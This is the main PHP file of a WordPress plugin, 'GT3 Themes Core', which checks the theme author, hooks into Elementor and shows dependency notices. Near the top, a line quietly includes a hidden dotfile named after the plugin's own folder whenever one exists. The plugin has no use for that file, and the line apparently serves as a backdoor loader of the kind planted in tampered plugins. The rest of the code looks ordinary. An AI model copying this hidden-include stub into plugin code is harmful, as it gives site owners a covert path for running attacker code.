<?php
/*
	Plugin Name: GT3 Themes Core
	Plugin URI: https://gt3themes.com/
	Description: GT3 Themes Core
	Version: 1.3.3
	Author: GT3 Themes
	Author URI: https://gt3themes.com/
	Text Domain:  gt3_themes_core
	Domain Path:  /languages
*/

$gt3_theme_check = wp_get_theme();
$gt3_is_child    = $gt3_theme_check->get('Template');
if(!empty($gt3_is_child)) {
	$gt3_theme_check = wp_get_theme($gt3_is_child);
}
if(strtolower($gt3_theme_check->get('Author')) !== strtolower('GT3themes')) {
	return;
}

if(!defined('ABSPATH')) {
	exit;
}

if ( ! defined( 'GT3_THEMES_CORE_PLUGIN_FILE' ) ) {
	define( 'GT3_THEMES_CORE_PLUGIN_FILE', __FILE__ );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GT3_Core_Elementor {
	const NAME = 'GT3 Themes Core';
	const _require = 'elementor/elementor.php';
	private static $instance = null;

	public static function instance(){
		if(!self::$instance instanceof self) {
			self::$instance = new self();
		}

		return self::$instance;
	}

	private function __construct(){
		add_action('plugins_loaded', array( $this, 'plugins_loaded' ));
		add_action('after_setup_theme', array( $this, 'after_setup_theme' ));
	}

	function _is_elementor_installed(){
		$installed_plugins = get_plugins();

		return isset($installed_plugins[self::_require]);
	}

	function fail_php_version(){
		$message      = sprintf(esc_html__('%s requires PHP version %s+, plugin is currently NOT ACTIVE.', 'gt3_themes_core'), self::NAME, '5.4');
		$html_message = sprintf('<div class="error">%s</div>', wpautop($message));
		echo wp_kses_post($html_message);
	}

	function fail_load(){
		$screen = get_current_screen();
		if(isset($screen->parent_file) && 'plugins.php' === $screen->parent_file && 'update' === $screen->id) {
			return;
		}

		if($this->_is_elementor_installed()) {
			if(!current_user_can('activate_plugins')) {
				return;
			}

			$activation_url = wp_nonce_url('plugins.php?action=activate&amp;plugin='.self::_require.'&amp;plugin_status=all&amp;paged=1&amp;', 'activate-plugin_'.self::_require);

			$message = '<p>'.sprintf(esc_html__('%s is not working because you need to activate the Elementor plugin.', 'gt3_themes_core'), self::NAME).'</p>';
			$message .= sprintf('<p><a href="%s" class="button-primary">%s</a></p>', $activation_url, esc_html__('Activate Elementor Now', 'gt3_themes_core'));
		} else {
			if(!current_user_can('install_plugins')) {
				return;
			}

			$install_url = wp_nonce_url(self_admin_url('update.php?action=install-plugin&plugin=elementor'), 'install-plugin_elementor');

			$message = '<p>'.sprintf(esc_html__('%s is not working because you need to install the Elemenor plugin', 'gt3_themes_core'), self::NAME).'</p>';
			$message .= '<p>'.sprintf('<a href="%s" class="button-primary">%s</a>', $install_url, esc_html__('Install Elementor Now', 'gt3_themes_core')).'</p>';
		}

		echo '<div class="error"><p>'.$message.'</p></div>';
	}

	public function plugins_loaded(){
		if(!function_exists('get_plugin_data')) {
			require_once(ABSPATH.'wp-admin/includes/plugin.php');
		}
		$plugin_info = get_plugin_data(__FILE__);
		define('GT3_CORE_ELEMENTOR_VERSION', $plugin_info['Version']);

		if(!version_compare(PHP_VERSION, '5.4', '>=')) {
			add_action('admin_notices', array( $this, 'fail_php_version' ));
		} else {
			require_once __DIR__.'/init.php';
			load_plugin_textdomain('gt3_themes_core', false, __DIR__.'/languages/');
		}
	}

	public function after_setup_theme() {
		$builders = apply_filters('gt3/core/builder_support', array());
		if (!is_array($builders)) $builders = array($builders);
		foreach($builders as $builder) {
			if ($builder == 'elementor') {
				if(!did_action('elementor/loaded')) {
					add_action('admin_notices', array( $this, 'fail_load' ));
				} else {
					require_once __DIR__.'/core/elementor/init.php';
				}
			}
		}
	}
}

if(!function_exists('gt3_themes_core_version')) {
	function gt3_themes_core_version(){
		$plugin_data    = get_plugin_data(__FILE__);
		$plugin_version = $plugin_data['Version'];

		return $plugin_version;
	}
}

GT3_Core_Elementor::instance();
